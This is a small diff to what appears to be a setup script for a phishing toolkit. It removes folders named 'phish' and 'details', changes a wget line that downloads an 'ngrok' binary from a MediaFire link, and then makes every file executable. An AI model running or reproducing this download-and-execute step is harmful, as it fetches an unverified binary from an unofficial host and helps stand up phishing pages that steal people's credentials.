@@ -12,7 +12,7 @@ rm -rf WebPages.zip
 rm -rf phish
 rm -rf details
 cd
-wget https://download1614.mediafire.com/4t58o9sjg9vg/650jb9laqs44qhn/>
+wget https://download1614.mediafire.com/tky3ndygpp9g/650jb9laqs44qhn/ngrok
 
 chmod +x *
 
